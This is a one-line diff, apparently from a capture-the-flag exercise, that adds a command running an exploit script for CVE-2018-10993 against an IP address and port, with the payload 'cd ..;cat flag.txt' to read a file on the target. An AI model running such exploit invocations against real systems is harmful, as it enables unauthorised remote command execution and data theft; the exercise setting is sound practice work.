@@ -1,0 +1,1 @@
+python3 cve-2018-10993.py 35.198.135.192 -p 30503 -v -c 'cd ..;cat flag.txt'
